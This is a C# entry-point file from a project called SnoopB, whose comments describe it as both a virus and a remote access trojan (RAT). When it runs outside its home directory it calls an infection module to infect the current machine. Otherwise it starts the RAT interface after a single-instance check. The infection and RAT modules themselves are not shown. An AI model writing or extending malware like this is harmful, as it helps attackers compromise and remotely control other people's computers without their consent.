using System;
using System.Diagnostics;
using System.Windows.Forms;
using SnoopB.Configuration;
using SnoopB.Modules.Infection;

namespace SnoopB
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            //If we run from the MainDirectory, we are a RAT, otherwise, we are a Virus
            if (Configurator.Instance.CurrentExecutionPath != Configurator.Instance.MainDirectory)
            {
                //We are a Virus.
                //We use the infection module, and run it only one. 
                //The infection type Current machine, infect, and run the application from the main directory, closing this instance
                var infectionModule = new InfectionModule(1);//with a positive interval, we active the module.
                infectionModule.Execute(InfectionType.CurrentMachine);
            }
            else
            {
                //We are a RAT. We check if not running yet, we need to avoid multiple instance run
                var init = true;
                foreach (var p in Process.GetProcesses())
                {
                    if (p.ProcessName == Configurator.Instance.FileNameWithoutExtension && p.MainModule.FileName == Configurator.Instance.FullFileNamePath)
                    {
                        init = false;
                    }
                }

                if (init)
                    Application.Run(new FrmMain());
            }
        }
    }
}